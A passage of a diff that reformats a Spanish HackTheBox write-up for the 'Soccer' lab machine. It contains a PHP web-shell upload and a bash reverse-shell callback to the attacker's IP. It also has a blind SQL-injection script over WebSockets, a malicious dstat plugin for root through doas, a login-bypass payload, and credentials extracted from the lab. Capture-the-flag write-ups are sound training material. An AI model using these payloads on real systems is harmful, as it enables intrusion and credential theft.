@@ -1,11 +1,9 @@
 ---
-category: writeup
-machine_name: Soccer
-platform: HackTheBox
-difficulty: Fácil
+category: ['HackTheBox', 'Easy', 'Linux']
 title: "Máquina Soccer"
 description: "Resolución de la máquina Soccer de HackTheBox"
 tags: ["Default credentials", "PHP Abuse", "Websockets", "Blind SQLi", "doas"]
+logo: '/assets/writeups/soccer/logo.png'
 ---
 
 En esta máquina Linux encontraremos un sitio web con un gestor de archivos web expuesto con las credenciales por defecto, por lo cual subiremos un archivo malicioso para
@@ -14,11 +12,11 @@ es vulnerable a una SQL injection pero al no poder ver los resultados de las con
 
 Finalmente, luego de ganar acceso escalaremos privilegios a root usando una entrada del usuario con el que ganamos acceso en el programa [doas](https://wiki.archlinux.org/title/Doas)
 
-<h2>RECONOCIMIENTO</h2>
+## RECONOCIMIENTO 
 
 La máquina tiene 3 puertos abiertos, dos parecen ser HTTP y uno es el SSH.
 
-{% highlight bash %}
+ ```bash
 Nmap 7.92 scan initiated Sun Dec 18 21:06:00 2022 as: nmap -sCV -p 9091,22,80 -Pn -n -vvv -oN services 10.10.11.194
 Nmap scan report for 10.10.11.194
 Host is up, received user-set (0.16s latency).
@@ -50,7 +48,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kern el
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Sun Dec 18 21:06:24 2022 -- 1 IP address (1 host up) scanned in 24.21 seconds
-{% endhighlight %}
+ ```
 
 Nmap nos dice que el sitio está bajo un dominio ya que nos envía al sitio http://soccer.htb, por lo que vamos a agregar el sitio a nuestro fichero de hosts.
 
@@ -66,11 +64,11 @@ El sitio web que posee es respecto a un equipo de fútbol de HTB.
 
 No tiene más nada de interesante, ni inspeccionando el código, por lo que podemos pasar a...
 
-<h2>INTRUSIÓN</h2>
+## INTRUSIÓN 
 
 Fuzzeando por rutas podemos encontrar una interesante llamada "tiny"
 
-{% highlight bash %}
+ ```bash
  ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://soccer.htb/FUZZ
 
         /'___\  /'___\           /'___\       
@@ -96,7 +94,7 @@ ________________________________________________
 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 210ms]
     * FUZZ: tiny
 
-{% endhighlight %}
+ ```
 
 Es un gestor de archivos...
 
@@ -126,7 +124,7 @@ Vamos a lanzarnos una consola interactiva hacía nuestro equipo
 http://soccer.htb/tiny/uploads/test.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.6/443 0>%261"
 ```
 
-{% highlight bash %}
+ ```bash
 ❯ nc -lvnp 443
 Listening on 0.0.0.0 443
 Connection received on 10.10.11.194 37646
@@ -142,16 +140,16 @@ www-data@soccer:~/html/tiny/uploads$ ^Z
                                     reset xterm
 www-data@soccer:~/html/tiny/uploads$ export TERM=xterm-256color
 www-data@soccer:~/html/tiny/uploads$ source /etc/skel/.bashrc
-{% endhighlight %}
+ ```
 
 Bien, explorando esta máquina no parece tener nada que nos permita escalar privilegios al único usuario que existe en el sistema, pero en el archivo de hosts y configuración de nginx existe un subdominio que no habíamos visto
 
-{% highlight bash %}
+ ```bash
 #/etc/hosts
 127.0.0.1	localhost	soccer	soccer.htb	soc-player.soccer.htb
 
 127.0.1.1	ubuntu-focal	ubuntu-focal
-{% endhighlight %}
+ ```
 
 Después de agregarlo a nuestro hosts, nos muestra la misma página de inicio de sesión pero con unos detalles extra... y entre ellos que hay unos nuevos botones de inicio de sesión y registro.
 
@@ -163,21 +161,21 @@ Registrandonos e iniciando sesión nos da una nueva sección para verificar si e
 
 Interceptando la petición vemos que se envia lo siguiente por el protocolo de WebSockets
 
-{% highlight json %}
+
 {"id":"60161"}
-{% endhighlight %}
+ ```
 
 Si la intentamos alterar por esto, aunque pongamos un identificador inválido
 
-{% highlight json %}
+ ```json
 {"id":"324234234 OR 1=1 -- -"}
-{% endhighlight %}
+ ```
 
 Nos dirá mágicamente que el ticket existe, por lo que parece ser una inyección SQL a ciegas donde solo podemos saber si la condición de la consulta devuelve verdadero (1) o falso (0).
 
 Vamos a crearnos un script en Python para automatizar esto y poder filtrar el contenido de la base de datos fácilmente. El endpoint no requiere de autenticación por lo que no es necesario tener a manos cookies o tokens para llevar a cabo el proceso.
 
-{% highlight python %}
+ ```python
 from pwn import log
 from time import sleep
 import websockets
@@ -229,49 +227,49 @@ while True:
     break
 
 status_bar.success("Done.")
-{% endhighlight %}
+ ```
 
 Ejecutando el script tal como lo tenemos arriba nos dice que la base de datos actual se llama "soccer_db"
 
-{% highlight bash %}
+ ```bash
 ❯ python3 websock.py
 [+] Status: Done.
 [d] Final payload: soccer_db
-{% endhighlight %}
+ ```
 
 Ahora, si alteramos el script para que nos muestre cuantas tablas tiene esta base de datos funciona y vemos una tabla llamada "accounts"
 
-{% highlight python %}
+ ```python
 await ws.send("{\"id\":\"1 OR IF((BINARY SUBSTR((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='soccer_db')," + str(pos) + ",1))='%s',1,FALSE)\"}" % char)
-{% endhighlight %}
+ ```
 
-{% highlight bash %}
+ ```bash
 ❯ python3 websock.py
 [+] Status: Done.
 [p] Final payload: accounts
-{% endhighlight %}
+ ```
 
 No sabemos cuales son sus columnas, pero juzgando por su nombre el nombre de usuario debe estar identificado por "username" y la contraseña por lo más obvio, "password"
 
 Si alteramos nuevamente el script para obtener el primer nombre de usuario de la página, encontramos que es "player"
 
-{% highlight bash %}
+ ```bash
 ❯ python3 websock.py
 [+] Status: Done.
 [▇] Final payload: player
-{% endhighlight %}
+ ```
 
 y su contraseña es...
 
-{% highlight bash %}
+ ```bash
 ❯ python3 websock.py
 [+] Status: Done.
 [°] Final payload: PlayerOftheMatch2022
-{% endhighlight %}
+ ```
 
 Accediendo con estas credenciales por SSH obtenemos acceso como el usuario "player" y podremos ver la primera flag.
 
-{% highlight bash %}
+ ```bash
 ❯ ssh player@soccer.htb
 player@soccer.htb\'s password: 
 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
@@ -308,13 +306,13 @@ lrwxrwxrwx 1 root   root      9 Nov 17  2022 .viminfo -> /dev/null
 -rw-r----- 1 root   player   33 Jun 18 22:35 user.txt
 player@soccer:~$ cat user.txt
 7ceaab2939234cdc99bc91b51d******
-{% endhighlight %}
+ ```
 
-<h2>ESCALADA DE PRIVILEGIOS</h2>
+## ESCALADA DE PRIVILEGIOS 
 
 Buscando por programas con el bit SUID establecido encontramos uno llamado "doas" y otras cosas del gestor de paquetes snap.
 
-{% highlight bash %}
+ ```bash
 player@soccer:~$ find / -perm -4000 2>/dev/null
 /usr/local/bin/doas
 /usr/lib/snapd/snap-confine
@@ -345,22 +343,22 @@ player@soccer:~$ find / -perm -4000 2>/dev/null
 /snap/core20/1695/usr/bin/umount
 /snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /snap/core20/1695/usr/lib/openssh/ssh-keysign
-{% endhighlight %}
+ ```
 
 Ese programa llamado doas es una alternativa al clásico `sudo` que es conocida por ser más ligera en cuanto a peso. Es usada por defecto en sistemas Linux como Alpine.
 
 Al ser una alternativa a sudo es obvio que puede tener reglas establecidas para un usuario, por lo que debemos ver su archivo de configuración, que podemos encontrarlo usando el mismo programa `find` ya que su nombre por defecto es `doas.conf` según la documentación en internet.
 
-{% highlight bash %}
+ ```bash
 player@soccer:~$ find / -name doas.conf 2>/dev/null
 /usr/local/etc/doas.conf
 player@soccer:~$ cat /usr/local/etc/doas.conf
 permit nopass player as root cmd /usr/bin/dstat
-{% endhighlight %}
+ ```
 
 Bueno, podemos ejecutar el comando `dstat` como root sin necesidad de contraseña; es un programa escrito en Python que permite monitorear los recursos del sistema...
 
-{% highlight bash %}
+ ```bash
 player@soccer:~$ doas /usr/bin/dstat --help
 Usage: dstat [-afv] [options..] [delay [count]]
 Versatile tool for generating system resource statistics)
@@ -419,11 +417,11 @@ Dstat options:
 
 delay is the delay in seconds between each update (default: 1)
 count is the number of updates to display before exiting (default: unlimited)
-{% endhighlight %}
+ ```
 
 Nos permite activar plugins externos que podemos listar usando `--list-`, pero nos interesaría más saber donde podemos incluir o instalar plugins; cosa que podemos ver viendo el código porque esto está escrito en Python
 
-{% highlight bash %}
+ ```bash
 player@soccer:~$ head -n 100 /usr/bin/dstat
 #! /usr/bin/python3
 
@@ -474,11 +472,11 @@ pluginpath = [
     '/usr/local/share/dstat/',
 ]
 ...
-{% endhighlight %}
+ ```
 
 En unos de esos directorios tenemos permisos de escritura
 
-{% highlight bash %}
+ ```bash
 player@soccer:/usr/local/share$ ls -la
 total 24
 drwxr-xr-x  6 root root   4096 Nov 17  2022 .
@@ -494,11 +492,11 @@ player@soccer:/usr/local/share/dstat$ ls -la
 total 8
 drwxrwx--- 2 root player 4096 Dec 12  2022 .
 drwxr-xr-x 6 root root   4096 Nov 17  2022 ..
-{% endhighlight %}
+ ```
 
 Por lo que podemos crearnos un simple script de Python que imite un plugin, cuya función será ejecutar un comando que nos haga una bash SUID. Debemos agregarle el prefijo `dstat_` a nuestro script como lo tienen los otros plugins ubicados en /usr/share/dstat para que el programa nos lo detecte
 
-{% highlight bash %}
+ ```bash
 player@soccer:/usr/local/share/dstat$ nano dstat_nonmalicious.py
 player@soccer:/usr/local/share/dstat$ cat dstat_nonmalicious.py 
 import os
@@ -519,11 +517,11 @@ internal:
 	vmk-int,vmk-nic,vz-cpu,vz-io,vz-ubc,wifi,zfs-arc,zfs-l2arc,zfs-zil
 /usr/local/share/dstat:
 	nonmalicious
-{% endhighlight %}
+ ```
 
 Ahora simplemente podemos ejecutarlo y tomar la última flag
 
-{% highlight bash %}
+ ```bash
 player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --nonmalicious
 /usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module\'s documentation for alternative uses
   import imp
@@ -550,19 +548,19 @@ bash-5.0# ls
 app  root.txt  run.sql	snap
 bash-5.0# cat root.txt
 29516b69bf594bbab762ad2b1a******
-{% endhighlight %}
+ ```
 
-<h2>EXTRA</h2>
+## EXTRA 
 
 La parte de inicio de sesión del aplicativo puedes saltártela con una inyección SQL similar a la que se vió en la máquina Vessel
 
-{% highlight bash %}
+ ```bash
 email[email]=1&password[password]=1
-{% endhighlight %}
+ ```
 
 Esto porque al programador se le olvidó verificar los tipos de datos que está recibiendo el servidor; si usas lenguajes de tipado débil como JavaScript siempre verifica bien los datos que recibe tu aplicación. 
 
-{% highlight javascript %}
+ ```javascript
 root@soccer:~/app# cat server.js
 ...
 app.use('/login', function(request, response) {
@@ -597,4 +595,4 @@ app.use('/login', function(request, response) {
     }
 });
 ...
-{% endhighlight %}
+ ```
